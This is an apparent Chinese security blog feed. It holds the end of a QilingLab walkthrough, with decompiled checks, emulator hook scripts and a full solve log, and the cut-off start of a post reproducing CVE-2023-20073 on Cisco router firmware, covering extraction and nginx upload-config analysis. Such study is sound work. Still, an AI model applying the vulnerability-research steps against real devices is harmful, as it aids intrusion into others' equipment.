class="line">    *i = <span class="built_in">tolower</span>(*i);</span><br><span class="line">  *a1 = <span class="built_in">strcmp</span>(src, dest) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个想法就是直接hook掉strcmp函数，或者也可以hook掉tolower函数</p><p>这里尽量hook tolower函数，不然下题就做不了啦~~~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_strcmp</span>(<span class="params">ql,*args</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_lower</span>(<span class="params">ql,*args</span>):</span><br><span class="line">ql.arch.regs.rax = ql.arch.regs.rdi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge9</span>(<span class="params">ql</span>):</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;strcmp&#x27;, my_strcmp,QL_INTERCEPT.EXIT)</span></span><br><span class="line">ql.os.set_api(<span class="string">&#x27;tolower&#x27;</span>, my_lower,QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure><h3 id="challenge10"><a href="#challenge10" class="headerlink" title="challenge10"></a>challenge10</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge10</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">ssize_t</span> v4; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cmdline&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">read</span>(fd, buf, <span class="number">0x3F</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">close</span>(fd);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; i; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !buf[i] )</span><br><span class="line">          buf[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      buf[v4] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;qilinglab&quot;</span>) )</span><br><span class="line">        *a1 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想法就是hook掉strcmp，但是上个challenge已经成功hook掉strcmp了，因此就劫持cmdline成一个结构体，直接返回qilinglab即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FakeCmdline</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;qilinglab&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge10</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&quot;/proc/self/cmdline&quot;</span>,FakeCmdline)</span><br></pre></td></tr></table></figure><h3 id="challenge11"><a href="#challenge11" class="headerlink" title="challenge11"></a>challenge11</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001195 89 75 D0                      mov     [rbp+var_30], esi</span><br><span class="line">.text:0000000000001198 89 4D CC                      mov     [rbp+var_34], ecx</span><br><span class="line">.text:000000000000119B 89 45 D4                      mov     [rbp+var_2C], eax</span><br><span class="line">.text:000000000000119E 81 7D D0 51 69 6C 69          cmp     [rbp+var_30], 696C6951h</span><br><span class="line">.text:00000000000011A5 75 19                         jnz     short loc_11C0</span><br><span class="line">.text:00000000000011A5</span><br><span class="line">.text:00000000000011A7 81 7D CC 6E 67 4C 61          cmp     [rbp+var_34], 614C676Eh</span><br><span class="line">.text:00000000000011AE 75 10                         jnz     short loc_11C0</span><br><span class="line">.text:00000000000011AE</span><br><span class="line">.text:00000000000011B0 81 7D D4 62 20 20 20          cmp     [rbp+var_2C], 20202062h</span><br><span class="line">.text:00000000000011B7 75 07                         jnz     short loc_11C0</span><br><span class="line">.text:00000000000011B7</span><br><span class="line">.text:00000000000011B9 48 8B 45 B8                   mov     rax, [rbp+var_48]</span><br><span class="line">.text:00000000000011BD C6 00 01                      mov     byte ptr [rax], 1</span><br></pre></td></tr></table></figure><p>就是让esi&#x3D;&#x3D;696C6951h &amp;&amp; ecx&#x3D;&#x3D;614C676Eh &amp;&amp; eax&#x3D;20202062h，就可以解决了，所以直接hook掉1195，使得这些寄存器为相应的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_regs</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;esi&quot;</span>,<span class="number">0x696C6951</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;ecx&quot;</span>,<span class="number">0x614C676E</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;eax&quot;</span>,<span class="number">0x20202062</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(set_regs, base+<span class="number">0x1195</span>)</span><br></pre></td></tr></table></figure><p>如此便解决了所有的挑战</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge1</span>(<span class="params">ql</span>):</span><br><span class="line">ql.mem.<span class="built_in">map</span>(<span class="number">0x1337</span>//<span class="number">4096</span>*<span class="number">4096</span> , <span class="number">0x1000</span>)</span><br><span class="line">ql.mem.write(<span class="number">0x1337</span>, <span class="string">b&quot;\x39\x05&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_uname_ret</span>(<span class="params">ql ,*args</span>): </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct utsname</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        char sysname[65];</span></span><br><span class="line"><span class="string">        char nodename[65];</span></span><br><span class="line"><span class="string">        char release[65];</span></span><br><span class="line"><span class="string">        char version[65];</span></span><br><span class="line"><span class="string">        char machine[65];</span></span><br><span class="line"><span class="string">        char domainname[65];</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rdi_value=ql.arch.regs.read(<span class="string">&quot;rdi&quot;</span>)</span><br><span class="line">ql.mem.write(rdi_value,<span class="string">b&#x27;QilingOS\x00&#x27;</span>)</span><br><span class="line">ql.mem.write(rdi_value+<span class="number">65</span>*<span class="number">3</span>,<span class="string">b&#x27;ChallengeStart\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge2</span>(<span class="params">ql</span>):</span><br><span class="line">ql.os.set_syscall(<span class="string">&quot;uname&quot;</span>,my_uname_ret,QL_INTERCEPT.EXIT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">if</span> size==<span class="number">0x20</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x02&quot;</span>*<span class="number">32</span></span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_getrandom_func</span>(<span class="params">ql, buf, count:<span class="built_in">int</span>, flag:<span class="built_in">int</span></span>) -&gt;<span class="built_in">int</span>:</span><br><span class="line">ql.mem.write(buf,<span class="string">b&#x27;\x02&#x27;</span>*count)</span><br><span class="line"><span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&#x27;/dev/urandom&#x27;</span>, FakeUrandom())</span><br><span class="line">ql.os.set_syscall(<span class="string">&quot;getrandom&quot;</span>,my_getrandom_func,QL_INTERCEPT.CALL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_1</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_1,base_addr+<span class="number">0x0E43</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_rets</span>(<span class="params">ql ,*args</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">win</span>(<span class="params">ql: Qiling</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] win&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge5</span>(<span class="params">ql</span>):</span><br><span class="line">ql.os.set_api(<span class="string">&#x27;rand&#x27;</span>, rand_rets)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_0,base_addr+<span class="number">0xF16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rdi_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rdi&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sleep</span>(<span class="params">ql,*args</span>):</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge7</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;sleep&#x27;, my_sleep)</span></span><br><span class="line">ql.hook_address(write_rdi_0,base_addr+<span class="number">0x00F3C</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_mem</span>(<span class="params">ql</span>):</span><br><span class="line">MAGIC=<span class="number">0x3DFCD6EA00000539</span></span><br><span class="line">struct_address = ql.mem.search(p64(MAGIC))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> struct_address <span class="keyword">or</span> <span class="built_in">len</span>(struct_address) &lt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;struct_address is not properly initialized&quot;</span>)</span><br><span class="line">mem_value1, mem_value2 ,mem_value3 = struct.unpack(<span class="string">&quot;QQQ&quot;</span>, ql.mem.read(struct_address[<span class="number">0</span>]-<span class="number">8</span>,<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug1&quot;</span>,<span class="built_in">hex</span>(mem_value1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug2&quot;</span>,<span class="built_in">hex</span>(mem_value2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug3&quot;</span>,<span class="built_in">hex</span>(mem_value3))</span><br><span class="line">ql.mem.write(mem_value3, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(search_mem, base+<span class="number">0xFB5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_strcmp</span>(<span class="params">ql,*args</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_lower</span>(<span class="params">ql,*args</span>):</span><br><span class="line">ql.arch.regs.rax = ql.arch.regs.rdi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge9</span>(<span class="params">ql</span>):</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;strcmp&#x27;, my_strcmp,QL_INTERCEPT.EXIT)</span></span><br><span class="line">ql.os.set_api(<span class="string">&#x27;tolower&#x27;</span>, my_lower,QL_INTERCEPT.EXIT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeCmdline</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;qilinglab&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge10</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&quot;/proc/self/cmdline&quot;</span>,FakeCmdline)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_regs</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;esi&quot;</span>,<span class="number">0x696C6951</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;ecx&quot;</span>,<span class="number">0x614C676E</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;eax&quot;</span>,<span class="number">0x20202062</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(set_regs, base+<span class="number">0x1195</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">ql = Qiling([<span class="string">r&quot;qilinglab-x86_64&quot;</span>], <span class="string">r&#x27;./qiling/examples/rootfs/x8664_linux&#x27;</span>, verbose=QL_VERBOSE.OFF)</span><br><span class="line"><span class="comment">#ql.verbose = 0</span></span><br><span class="line"><span class="comment">#ql.debugger = &quot;gdb:0.0.0.0:9999&quot;</span></span><br><span class="line"><span class="comment">#base_addr = ql.mem.get_lib_base(ql.path)</span></span><br><span class="line"><span class="comment">#ql.hook_address(win, base_addr + 0x12C5) </span></span><br><span class="line">challenge1(ql)</span><br><span class="line">challenge2(ql)</span><br><span class="line">challenge3(ql)</span><br><span class="line">challenge4(ql)</span><br><span class="line">challenge5(ql)</span><br><span class="line">challenge6(ql)</span><br><span class="line">challenge7(ql)</span><br><span class="line">challenge8(ql)</span><br><span class="line">challenge9(ql)</span><br><span class="line">challenge10(ql)</span><br><span class="line">challenge11(ql)</span><br><span class="line">ql.run()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">s1nec-1o@s1nec1o:~/Qiling$ python3 solve.py </span><br><span class="line">Welcome to QilingLab.</span><br><span class="line">Here is the list of challenges:</span><br><span class="line">Challenge 1: Store 1337 at pointer 0x1337.</span><br><span class="line">Challenge 2: Make the &#x27;uname&#x27; syscall return the correct values.</span><br><span class="line">Challenge 3: Make &#x27;/dev/urandom&#x27; and &#x27;getrandom&#x27; &quot;collide&quot;.</span><br><span class="line">Challenge 4: Enter inside the &quot;forbidden&quot; loop.</span><br><span class="line">Challenge 5: Guess every call to rand().</span><br><span class="line">Challenge 6: Avoid the infinite loop.</span><br><span class="line">Challenge 7: Don&#x27;t waste time waiting for &#x27;sleep&#x27;.</span><br><span class="line">Challenge 8: Unpack the struct and write at the target address.</span><br><span class="line">Challenge 9: Fix some string operation to make the iMpOsSiBlE come true.</span><br><span class="line">Challenge 10: Fake the &#x27;cmdline&#x27; line file to return the right content.</span><br><span class="line">Challenge 11: Bypass CPUID/MIDR_EL1 checks.</span><br><span class="line"></span><br><span class="line">Checking which challenge are solved...</span><br><span class="line">Note: Some challenges will results in segfaults and infinite loops if they aren&#x27;t solved.</span><br><span class="line"></span><br><span class="line">Challenge 1: SOLVED</span><br><span class="line">Challenge 2: SOLVED</span><br><span class="line">Challenge 3: SOLVED</span><br><span class="line">Challenge 4: SOLVED</span><br><span class="line">Challenge 5: SOLVED</span><br><span class="line">Challenge 6: SOLVED</span><br><span class="line">[*] debug1 0x55555575a690</span><br><span class="line">[*] debug2 0x3dfcd6ea00000539</span><br><span class="line">[*] debug3 0x80000000dd54</span><br><span class="line">Challenge 7: SOLVED</span><br><span class="line">Challenge 8: SOLVED</span><br><span class="line">Challenge 9: SOLVED</span><br><span class="line">Challenge 10: SOLVED</span><br><span class="line">Challenge 11: SOLVED</span><br><span class="line">You solved 11/11 of the challenges</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;做完这些lab，对qiling的作用，这个framework的理解，更加的深，希望看到这里的读者可以自己去做一遍，不要纯看他人的wp，因为每</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Qiling" scheme="http://s1nec-1o.github.io/tags/Qiling/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-20073复现</title>
    <link href="http://s1nec-1o.github.io/2024/08/11/CVE-2023-20073%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/08/11/CVE-2023-20073%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-08-11T15:30:17.000Z</published>
    <updated>2024-08-11T15:32:00.590Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-20073"><a href="#CVE-2023-20073" class="headerlink" title="CVE-2023-20073"></a>CVE-2023-20073</h1><h1 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h1><p>首先在官网下载对应版本的<a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29">固件</a>，之后binwalk -Me解压，但是会出现一个问题，便是因为其软连接指向的是他的文件系统根目录下的，而当前根目录是我们的主机，想来也不会让其随便的建立软连接，他又只是一个机器，因此无法自己指向自己的根目录下，那我们只好再次自己去解压</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331139.png" alt="image-20240811213143133"></p><p>在这个目录下执行 <code>ubi_reader 0.ubi</code>，但是我本身拥有这个ubi_reader，是从binwalk源码下载的，他自己却不能一次binwalk解压成功，确实让人匪夷所思，可能是要多加一些什么参数吧</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><h2 id="配置文件分析"><a href="#配置文件分析" class="headerlink" title="配置文件分析"></a>配置文件分析</h2><p>首先在&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;目录下有很多nginx的配置模块</p><p>首先看&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;rest.url.conf</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331141.png" alt="image-20240811131431353"></p><p>看到它分为五个模块，其中主要看第三个模块，即文件上传模块</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 